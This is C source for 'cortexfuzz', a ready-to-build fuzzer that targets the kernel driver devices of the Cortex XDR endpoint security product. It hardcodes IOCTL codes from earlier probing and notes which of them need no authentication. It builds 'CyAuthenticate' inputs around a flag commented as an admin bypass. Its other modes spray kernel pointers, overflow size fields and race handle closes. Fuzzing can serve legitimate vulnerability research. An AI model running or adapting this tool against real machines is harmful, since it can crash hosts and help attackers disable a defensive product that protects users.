/*
 * perdun/fuzz/cortexfuzz.c
 * targeted Cortex XDR driver fuzzer — all modes
 *
 * build:  x86_64-w64-mingw32-gcc -O2 -o cortexfuzz.exe fuzz/cortexfuzz.c -lntdll
 * usage:  cortexfuzz.exe                    — full auto all modes
 *         cortexfuzz.exe -n 2000000         — iterations per mode
 *         cortexfuzz.exe -m dumb            — only dumb mode
 *         cortexfuzz.exe -m race            — only race mode
 *         cortexfuzz.exe -m sequence        — only sequence mode
 *         cortexfuzz.exe -m struct          — only structure-aware mode
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <process.h>

/* ================================================================
 * Config
 * ================================================================ */

#define DEFAULT_ROUNDS   1000000
#define MAX_BUF          4096
#define RACE_THREADS     4
#define SEQ_MAX_CHAIN    8
#define LOG_DIR          "C:\\perdun_cortex"

/* ================================================================
 * Cortex XDR targets — hardcoded from probe results
 * ================================================================ */

typedef struct {
    const char *name;
    const char *devpath;
    DWORD ioctls[64];
    int n_ioctls;
    DWORD open_ioctls[16];   /* err=0 IOCTLs (no auth needed) */
    int n_open;
} cortex_target;

static cortex_target targets[] = {
    {
        "CyvrMitControl",
        "\\Device\\CyvrMitControl",
        {
            0x00226000, 0x0022600C, 0x00226018, 0x00226020, 0x00226028,
            0x0022602C, 0x00226030, 0x00226034, 0x00226038, 0x0022603C,
            0x00226044, 0x00226048, 0x00226050, 0x0022606C, 0x00226070,
            0x002260C0, 0x002260C4, 0x002260D0, 0x002220D4, 0x002220D8,
            0x002220DC, 0x002220E0, 0x002220E4, 0x002220E8, 0x002220EC,
            0x002220F0, 0x002220F4, 0x002220F8, 0x002220FC, 0x00222100,
            0x00222104, 0x00222108, 0x0022210C, 0x00222110, 0x00226140,
            0x00226144, 0x00226148, 0x0022614C, 0x00226150, 0x00226154,
            0x00226158, 0x0022615C, 0x00226160, 0x00226164, 0x00222168,
            0x0022216C, 0x00222170, 0x00222178, 0x0022217C, 0x00222180,
            0x00226184, 0x00222188, 0x0022218C,
        },
        53,
        { 0x00226020, 0x00226030, 0x002220DC, 0x002220F0, 0x0022606C, 0x00226150 },
        6
    },
    {
        "PaloEdrControlDevice",
        "\\Device\\PaloEdrControlDevice",
        {
            0x002260D0, 0x002260D4, 0x002260DC, 0x002220E0, 0x002260E4,
            0x002260E8, 0x002260EC, 0x002220F0, 0x002260F4, 0x00226100,
            0x00226104, 0x00226108, 0x0022210C, 0x00222110, 0x00222114,
            0x00222118, 0x0022211C, 0x00222120, 0x00222124, 0x00222128,
            0x0022212C, 0x00222130, 0x00226134, 0x00222138, 0x0022213C,
            0x00222140, 0x00222144, 0x00222148, 0x0022214C, 0x00222150,
            0x00222154, 0x00222158, 0x0022215C, 0x00222160, 0x00222164,
            0x00222168,
        },
        36,
        { 0x002260D4 },
        1
    },
    {
        "PaloNull",
        "\\Device\\PaloNull",
        { 0 },
        0,
        { 0 },
        0
    },
};
#define N_TARGETS (sizeof(targets)/sizeof(targets[0]))

/* ================================================================
 * RNG
 * ================================================================ */

static __declspec(thread) unsigned int rng_state;

static void rng_seed(unsigned int s) { rng_state = s; }
static unsigned int rng_next(void)
{
    rng_state ^= rng_state << 13;
    rng_state ^= rng_state >> 17;
    rng_state ^= rng_state << 5;
    return rng_state;
}
static unsigned int rng_range(unsigned int lo, unsigned int hi)
{
    if (lo >= hi) return lo;
    return lo + (rng_next() % (hi - lo + 1));
}

/* ================================================================
 * Device open
 * ================================================================ */

static HANDLE open_dev(const char *devpath)
{
    char full[512];
    snprintf(full, sizeof(full), "\\\\.\\GLOBALROOT%s", devpath);
    HANDLE h = CreateFileA(full, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        h = CreateFileA(full, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    return h;
}

/* ================================================================
 * Logging
 * ================================================================ */

static FILE *open_log(const char *target_name, const char *mode_name)
{
    char path[512];
    snprintf(path, sizeof(path), "%s\\%s_%s.log", LOG_DIR, target_name, mode_name);
    FILE *f = fopen(path, "w");
    if (f) {
        fprintf(f, "# perdun cortexfuzz\n# target: %s\n# mode: %s\n# time: %lld\n",
                target_name, mode_name, (long long)time(NULL));
        fflush(f);
    }
    return f;
}

static void log_pre(FILE *f, DWORD iter, DWORD ioctl, const BYTE *buf,
                    DWORD size)
{
    if (!f) return;
    fprintf(f, "[%08lu] ioctl=0x%08lX sz=%lu data=",
            (unsigned long)iter, (unsigned long)ioctl, (unsigned long)size);
    DWORD n = size < 64 ? size : 64;
    for (DWORD i = 0; i < n; i++) fprintf(f, "%02X", buf[i]);
    if (size > 64) fprintf(f, "...");
    fprintf(f, "\n");
    fflush(f);
}

static void log_post(FILE *f, DWORD iter, DWORD err, DWORD ret)
{
    if (!f) return;
    fprintf(f, "[%08lu] => err=%lu ret=%lu\n",
            (unsigned long)iter, (unsigned long)err, (unsigned long)ret);
}

/* ================================================================
 * Mutation strategies
 * ================================================================ */

static const BYTE boundaries[][8] = {
    {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
    {0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x00},
    {0xFF,0xFF,0xFF,0x7F,0x00,0x00,0x00,0x00},
    {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80},
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x7F},
    {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    {0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00},
    {0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00},
    {0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41},
    {0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00},  /* 256 */
    {0xFE,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00},  /* -2 as int32 */
    {0xFD,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00},  /* -3 as int32 */
};
#define N_BOUNDS (sizeof(boundaries)/sizeof(boundaries[0]))

static void mut_random(BYTE *buf, DWORD size)
{
    for (DWORD i = 0; i < size; i += 4) {
        DWORD r = rng_next();
        DWORD c = (size - i) < 4 ? (size - i) : 4;
        memcpy(buf + i, &r, c);
    }
}

static void mut_bitflip(BYTE *buf, DWORD size)
{
    memset(buf, 0, size);
    int flips = rng_range(1, 16);
    for (int i = 0; i < flips; i++) {
        if (size > 0)
            buf[rng_range(0, size-1)] ^= (1 << (rng_next() % 8));
    }
}

static void mut_boundary(BYTE *buf, DWORD size)
{
    memset(buf, 0, size);
    if (size < 8) return;
    /* insert 1-4 boundary values at random aligned offsets */
    int count = rng_range(1, 4);
    for (int i = 0; i < count; i++) {
        DWORD off = rng_range(0, size - 8) & ~7u;
        memcpy(buf + off, boundaries[rng_next() % N_BOUNDS], 8);
    }
}

static void mut_sliding(BYTE *buf, DWORD size)
{
    /* fill with pattern, then slide a boundary value across */
    memset(buf, 'A', size);
    DWORD bnd = rng_next() % N_BOUNDS;
    DWORD off = rng_range(0, size > 8 ? size - 8 : 0) & ~3u;
    DWORD c = (size - off) < 8 ? (size - off) : 8;
    memcpy(buf + off, boundaries[bnd], c);
}

static void mut_overflow_sizes(BYTE *buf, DWORD size)
{
    /* first 4-8 bytes are plausible, rest is overflow attempt */
    memset(buf, 0, size);
    if (size >= 4) {
        DWORD sizes[] = { 0, 1, 0xFFFFFFFF, 0x7FFFFFFF, 0x80000000,
                          0x10000, 0x1000, 0xFFFFFFFE, size, size*2 };
        DWORD val = sizes[rng_next() % 10];
        memcpy(buf, &val, 4);
    }
    if (size >= 8) {
        DWORD val2 = rng_next();
        memcpy(buf + 4, &val2, 4);
    }
    /* rest: random garbage */
    for (DWORD i = 8; i < size; i += 4) {
        DWORD r = rng_next();
        DWORD c = (size - i) < 4 ? (size - i) : 4;
        memcpy(buf + i, &r, c);
    }
}

static void mut_pointer_spray(BYTE *buf, DWORD size)
{
    /* fill with fake kernel/user pointers */
    DWORD64 ptrs[] = {
        0x0000000000000000ULL,
        0x0000000000000001ULL,
        0x00000000DEADBEEFULL,
        0x0000000041414141ULL,
        0xFFFFFFFFFFFFFFFFULL,
        0xFFFF800000000000ULL,  /* kernel range */
        0xFFFFF80000000000ULL,  /* typical kernel base area */
        0x00007FFFFFFFFFFFULL,  /* max user addr */
        0x0000000000010000ULL,  /* just above null page */
        0x00000000FFFF0000ULL,  /* near 4GB boundary */
    };
    int nptrs = sizeof(ptrs)/sizeof(ptrs[0]);
    for (DWORD i = 0; i + 8 <= size; i += 8) {
        DWORD64 p = ptrs[rng_next() % nptrs];
        memcpy(buf + i, &p, 8);
    }
}

static void generate_dumb(BYTE *buf, DWORD maxsize, DWORD *out_size)
{
    int strat = rng_next() % 8;
    DWORD size = maxsize;

    switch (strat) {
    case 0: mut_random(buf, size); break;
    case 1: mut_bitflip(buf, size); break;
    case 2: mut_boundary(buf, size); break;
    case 3: memset(buf, 0, size); break;
    case 4: memset(buf, 0xFF, size); break;
    case 5: /* truncate */
        size = rng_range(0, maxsize);
        memset(buf, 0x41, maxsize);
        break;
    case 6: mut_sliding(buf, size); break;
    case 7: mut_overflow_sizes(buf, size); break;
    }
    *out_size = size;
}

/* ================================================================
 * Structure-aware mutations for known Cortex IOCTLs
 * ================================================================ */

/*
 * CyAuthenticate (0x002260D4 on PaloEdrControlDevice):
 * offset 0x00: password pointer/data (can be null)
 * offset 0x08: flags — 0x5400 = admin bypass
 * Total buffer ~0x40 bytes
 */
static void mut_cyauth(BYTE *buf, DWORD maxsize, DWORD *out_size)
{
    memset(buf, 0, maxsize);
    *out_size = maxsize < 0x40 ? maxsize : 0x40;

    int variant = rng_next() % 6;
    switch (variant) {
    case 0: /* null password + admin flags */
        if (*out_size >= 0x10) {
            DWORD flags = 0x5400;
            memcpy(buf + 0x08, &flags, 4);
        }
        break;
    case 1: /* random flags */
        if (*out_size >= 0x10) {
            DWORD flags = rng_next();
            memcpy(buf + 0x08, &flags, 4);
        }
        break;
    case 2: /* flags with specific bits */
        if (*out_size >= 0x10) {
            DWORD flag_vals[] = { 0x5400, 0x5401, 0x5000, 0x0400,
                                  0xFFFF, 0x5500, 0x54FF, 0x0000 };
            DWORD flags = flag_vals[rng_next() % 8];
            memcpy(buf + 0x08, &flags, 4);
        }
        break;
    case 3: /* oversized password field */
        memset(buf, 'B', *out_size);
        if (*out_size >= 0x10) {
            DWORD flags = 0x5400;
            memcpy(buf + 0x08, &flags, 4);
        }
        break;
    case 4: /* boundary values in all fields */
        mut_boundary(buf, *out_size);
        break;
    case 5: /* random with valid-ish structure */
        mut_random(buf, *out_size);
        if (*out_size >= 0x10) {
            DWORD flags = 0x5400 | (rng_next() & 0xFF);
            memcpy(buf + 0x08, &flags, 4);
        }
        break;
    }
}

/*
 * Resource exhaustion IOCTL (0x002260D0 on CyvrMitControl):
 * no auth check — send varied buffer sizes
 */
static void mut_resource(BYTE *buf, DWORD maxsize, DWORD *out_size)
{
    DWORD sizes[] = { 0, 1, 4, 8, 16, 64, 256, 1024, 4096 };
    *out_size = sizes[rng_next() % 9];
    if (*out_size > maxsize) *out_size = maxsize;
    mut_random(buf, *out_size);
}

static void generate_struct_aware(BYTE *buf, DWORD maxsize, DWORD *out_size,
                                  DWORD ioctl)
{
    switch (ioctl) {
    case 0x002260D4: /* CyAuthenticate */
        mut_cyauth(buf, maxsize, out_size);
        break;
    case 0x002260D0: /* resource exhaustion */
        mut_resource(buf, maxsize, out_size);
        break;
    default:
        /* generic structure-aware: valid-looking header + mutated body */
        memset(buf, 0, maxsize);
        *out_size = rng_range(4, maxsize);
        /* first 4 bytes: small plausible size/version */
        if (*out_size >= 4) {
            DWORD hdr_vals[] = { *out_size, 1, 2, 0, *out_size - 4 };
            DWORD hdr = hdr_vals[rng_next() % 5];
            memcpy(buf, &hdr, 4);
        }
        /* rest: mutated */
        int sub = rng_next() % 4;
        switch (sub) {
        case 0: mut_random(buf + 4, *out_size > 4 ? *out_size - 4 : 0); break;
        case 1: mut_boundary(buf, *out_size); break;
        case 2: mut_pointer_spray(buf + 4, *out_size > 4 ? *out_size - 4 : 0); break;
        case 3: mut_overflow_sizes(buf, *out_size); break;
        }
        break;
    }
}

/* ================================================================
 * Mode 1: Dumb fuzzing
 * ================================================================ */

static void run_dumb(cortex_target *tgt, DWORD rounds)
{
    if (tgt->n_ioctls == 0) return;

    printf("    [dumb] %lu rounds on %d IOCTLs\n",
           (unsigned long)rounds, tgt->n_ioctls);

    HANDLE h = open_dev(tgt->devpath);
    if (h == INVALID_HANDLE_VALUE) {
        printf("    [!] cannot open %s\n", tgt->devpath);
        return;
    }

    FILE *log = open_log(tgt->name, "dumb");
    BYTE *inbuf = (BYTE *)calloc(1, MAX_BUF);
    BYTE *outbuf = (BYTE *)calloc(1, MAX_BUF);
    time_t t0 = time(NULL);
    int interesting = 0;

    for (DWORD i = 0; i < rounds; i++) {
        DWORD ioctl = tgt->ioctls[rng_next() % tgt->n_ioctls];
        DWORD sz = 0;
        memset(inbuf, 0, MAX_BUF);
        DWORD maxsz = rng_range(4, MAX_BUF);
        generate_dumb(inbuf, maxsz, &sz);

        log_pre(log, i, ioctl, inbuf, sz);

        DWORD ret = 0;
        BOOL ok = DeviceIoControl(h, ioctl, inbuf, sz, outbuf, MAX_BUF, &ret, NULL);
        DWORD err = ok ? 0 : GetLastError();

        log_post(log, i, err, ret);

        if (ok && ret > 0) interesting++;

        if (i > 0 && i % 100000 == 0) {
            time_t el = time(NULL) - t0;
            printf("      [%lu/%lu] %.0f/sec\n",
                   (unsigned long)i, (unsigned long)rounds,
                   el > 0 ? (double)i/el : 0);
        }
    }

    time_t el = time(NULL) - t0;
    printf("    [dumb] done %lds, %d interesting\n", (long)el, interesting);
    if (log) fclose(log);
    free(inbuf); free(outbuf);
    CloseHandle(h);
}

/* ================================================================
 * Mode 2: Structure-aware fuzzing
 * ================================================================ */

static void run_struct(cortex_target *tgt, DWORD rounds)
{
    if (tgt->n_ioctls == 0) return;

    printf("    [struct] %lu rounds\n", (unsigned long)rounds);

    HANDLE h = open_dev(tgt->devpath);
    if (h == INVALID_HANDLE_VALUE) return;

    FILE *log = open_log(tgt->name, "struct");
    BYTE *inbuf = (BYTE *)calloc(1, MAX_BUF);
    BYTE *outbuf = (BYTE *)calloc(1, MAX_BUF);
    time_t t0 = time(NULL);
    int interesting = 0;

    for (DWORD i = 0; i < rounds; i++) {
        DWORD ioctl = tgt->ioctls[rng_next() % tgt->n_ioctls];
        DWORD sz = 0;
        memset(inbuf, 0, MAX_BUF);
        generate_struct_aware(inbuf, MAX_BUF, &sz, ioctl);

        log_pre(log, i, ioctl, inbuf, sz);

        DWORD ret = 0;
        BOOL ok = DeviceIoControl(h, ioctl, inbuf, sz, outbuf, MAX_BUF, &ret, NULL);
        DWORD err = ok ? 0 : GetLastError();

        log_post(log, i, err, ret);
        if (ok && ret > 0) interesting++;

        if (i > 0 && i % 100000 == 0) {
            time_t el = time(NULL) - t0;
            printf("      [%lu/%lu] %.0f/sec\n",
                   (unsigned long)i, (unsigned long)rounds,
                   el > 0 ? (double)i/el : 0);
        }
    }

    time_t el = time(NULL) - t0;
    printf("    [struct] done %lds, %d interesting\n", (long)el, interesting);
    if (log) fclose(log);
    free(inbuf); free(outbuf);
    CloseHandle(h);
}

/* ================================================================
 * Mode 3: Race condition fuzzing (multi-threaded)
 * ================================================================ */

typedef struct {
    cortex_target *tgt;
    DWORD rounds;
    int thread_id;
    volatile int *running;
    FILE *log;
    CRITICAL_SECTION *log_cs;
} race_ctx;

static unsigned __stdcall race_worker(void *arg)
{
    race_ctx *ctx = (race_ctx *)arg;
    rng_seed((unsigned int)time(NULL) ^ GetCurrentThreadId() ^ ctx->thread_id);

    BYTE *inbuf = (BYTE *)calloc(1, MAX_BUF);
    BYTE *outbuf = (BYTE *)calloc(1, MAX_BUF);

    while (*(ctx->running)) {
        /* each thread opens its own handle sometimes, reuses sometimes */
        HANDLE h = open_dev(ctx->tgt->devpath);
        if (h == INVALID_HANDLE_VALUE) {
            Sleep(1);
            continue;
        }

        /* rapid-fire a batch of IOCTLs */
        int batch = rng_range(1, 50);
        for (int j = 0; j < batch && *(ctx->running); j++) {
            DWORD ioctl = ctx->tgt->ioctls[rng_next() % ctx->tgt->n_ioctls];
            DWORD sz = 0;
            memset(inbuf, 0, MAX_BUF);
            generate_dumb(inbuf, rng_range(4, 512), &sz);

            DWORD ret = 0;
            DeviceIoControl(h, ioctl, inbuf, sz, outbuf, MAX_BUF, &ret, NULL);
        }

        /* sometimes close mid-batch to trigger use-after-close races */
        if (rng_next() % 3 == 0) {
            CloseHandle(h);
            /* immediately re-send on closed handle */
            DWORD ioctl = ctx->tgt->ioctls[rng_next() % ctx->tgt->n_ioctls];
            DWORD ret = 0;
            DeviceIoControl(h, ioctl, inbuf, 64, outbuf, 64, &ret, NULL);
        } else {
            CloseHandle(h);
        }
    }

    free(inbuf);
    free(outbuf);
    return 0;
}

/* thread that hammers open/close while others send IOCTLs */
static unsigned __stdcall race_handle_churner(void *arg)
{
    race_ctx *ctx = (race_ctx *)arg;
    rng_seed((unsigned int)time(NULL) ^ 0xDEAD ^ ctx->thread_id);

    while (*(ctx->running)) {
        HANDLE h = open_dev(ctx->tgt->devpath);
        if (h != INVALID_HANDLE_VALUE) {
            /* hold briefly then close */
            if (rng_next() % 2)
                Sleep(0);
            CloseHandle(h);
        }
    }
    return 0;
}

static void run_race(cortex_target *tgt, DWORD duration_sec)
{
    if (tgt->n_ioctls == 0) return;

    printf("    [race] %lu seconds, %d worker + 1 churner threads\n",
           (unsigned long)duration_sec, RACE_THREADS);

    volatile int running = 1;
    CRITICAL_SECTION log_cs;
    InitializeCriticalSection(&log_cs);
    FILE *log = open_log(tgt->name, "race");

    HANDLE threads[RACE_THREADS + 1];
    race_ctx ctxs[RACE_THREADS + 1];

    /* worker threads */
    for (int i = 0; i < RACE_THREADS; i++) {
        ctxs[i].tgt = tgt;
        ctxs[i].rounds = 0;
        ctxs[i].thread_id = i;
        ctxs[i].running = &running;
        ctxs[i].log = log;
        ctxs[i].log_cs = &log_cs;
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, race_worker, &ctxs[i], 0, NULL);
    }

    /* handle churner thread */
    ctxs[RACE_THREADS].tgt = tgt;
    ctxs[RACE_THREADS].thread_id = RACE_THREADS;
    ctxs[RACE_THREADS].running = &running;
    threads[RACE_THREADS] = (HANDLE)_beginthreadex(NULL, 0, race_handle_churner,
                                                    &ctxs[RACE_THREADS], 0, NULL);

    Sleep(duration_sec * 1000);
    running = 0;

    WaitForMultipleObjects(RACE_THREADS + 1, threads, TRUE, 10000);
    for (int i = 0; i <= RACE_THREADS; i++)
        CloseHandle(threads[i]);

    printf("    [race] done\n");
    if (log) fclose(log);
    DeleteCriticalSection(&log_cs);
}

/* ================================================================
 * Mode 4: IOCTL sequence fuzzing
 * ================================================================ */

static void run_sequence(cortex_target *tgt, DWORD rounds)
{
    if (tgt->n_ioctls == 0) return;

    printf("    [sequence] %lu chains\n", (unsigned long)rounds);

    FILE *log = open_log(tgt->name, "sequence");
    BYTE *inbuf = (BYTE *)calloc(1, MAX_BUF);
    BYTE *outbuf = (BYTE *)calloc(1, MAX_BUF);
    time_t t0 = time(NULL);
    int interesting = 0;

    for (DWORD i = 0; i < rounds; i++) {
        /* open fresh handle per chain */
        HANDLE h = open_dev(tgt->devpath);
        if (h == INVALID_HANDLE_VALUE) continue;

        int chain_len = rng_range(2, SEQ_MAX_CHAIN);

        if (log) {
            fprintf(log, "[chain %08lu] len=%d\n", (unsigned long)i, chain_len);
            fflush(log);
        }

        for (int step = 0; step < chain_len; step++) {
            DWORD ioctl = tgt->ioctls[rng_next() % tgt->n_ioctls];
            DWORD sz = 0;
            memset(inbuf, 0, MAX_BUF);

            /* mix dumb and struct-aware within chains */
            if (rng_next() % 2)
                generate_dumb(inbuf, rng_range(4, 512), &sz);
            else
                generate_struct_aware(inbuf, 512, &sz, ioctl);

            log_pre(log, i * 100 + step, ioctl, inbuf, sz);

            DWORD ret = 0;
            BOOL ok = DeviceIoControl(h, ioctl, inbuf, sz,
                                      outbuf, MAX_BUF, &ret, NULL);
            DWORD err = ok ? 0 : GetLastError();
            log_post(log, i * 100 + step, err, ret);

            if (ok && ret > 0) interesting++;

            /* use output as partial input for next step (state chaining) */
            if (ok && ret > 0 && ret < MAX_BUF && rng_next() % 2) {
                DWORD copy = ret < 64 ? ret : 64;
                memcpy(inbuf, outbuf, copy);
            }
        }

        CloseHandle(h);

        if (i > 0 && i % 50000 == 0) {
            time_t el = time(NULL) - t0;
            printf("      [%lu/%lu] %.0f chains/sec\n",
                   (unsigned long)i, (unsigned long)rounds,
                   el > 0 ? (double)i/el : 0);
        }
    }

    time_t el = time(NULL) - t0;
    printf("    [sequence] done %lds, %d interesting\n", (long)el, interesting);
    if (log) fclose(log);
    free(inbuf);
    free(outbuf);
}

/* ================================================================
 * Main
 * ================================================================ */

static void run_all_modes(cortex_target *tgt, DWORD rounds)
{
    printf("\n  === %s (%d IOCTLs, %d open) ===\n",
           tgt->name, tgt->n_ioctls, tgt->n_open);

    if (tgt->n_ioctls == 0) {
        printf("    skipping (no IOCTLs)\n");
        return;
    }

    HANDLE h = open_dev(tgt->devpath);
    if (h == INVALID_HANDLE_VALUE) {
        printf("    [!] cannot open device\n");
        return;
    }
    CloseHandle(h);

    run_dumb(tgt, rounds);
    run_struct(tgt, rounds);
    run_race(tgt, rounds > 500000 ? 120 : 60);  /* seconds */
    run_sequence(tgt, rounds / 4);
}

int main(int argc, char *argv[])
{
    DWORD rounds = DEFAULT_ROUNDS;
    const char *only_mode = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 && i+1 < argc)
            rounds = strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "-m") == 0 && i+1 < argc)
            only_mode = argv[++i];
    }

    rng_seed((unsigned int)time(NULL) ^ GetCurrentProcessId());

    printf("============================================\n");
    printf("  perdun cortexfuzz — Cortex XDR fuzzer\n");
    printf("============================================\n");
    printf("[*] rounds per mode: %lu\n", (unsigned long)rounds);
    if (only_mode) printf("[*] mode: %s only\n", only_mode);
    printf("[*] logs: %s\n\n", LOG_DIR);

    CreateDirectoryA(LOG_DIR, NULL);

    for (int t = 0; t < (int)N_TARGETS; t++) {
        cortex_target *tgt = &targets[t];

        if (tgt->n_ioctls == 0) continue;

        printf("  === %s (%d IOCTLs) ===\n", tgt->name, tgt->n_ioctls);

        HANDLE h = open_dev(tgt->devpath);
        if (h == INVALID_HANDLE_VALUE) {
            printf("    [!] cannot open, skipping\n\n");
            continue;
        }
        CloseHandle(h);

        if (!only_mode || strcmp(only_mode, "dumb") == 0)
            run_dumb(tgt, rounds);
        if (!only_mode || strcmp(only_mode, "struct") == 0)
            run_struct(tgt, rounds);
        if (!only_mode || strcmp(only_mode, "race") == 0)
            run_race(tgt, rounds > 500000 ? 120 : 60);
        if (!only_mode || strcmp(only_mode, "sequence") == 0)
            run_sequence(tgt, rounds / 4);

        printf("\n");
    }

    printf("============================================\n");
    printf("  COMPLETE — check %s for logs\n", LOG_DIR);
    printf("============================================\n");

    return 0;
}
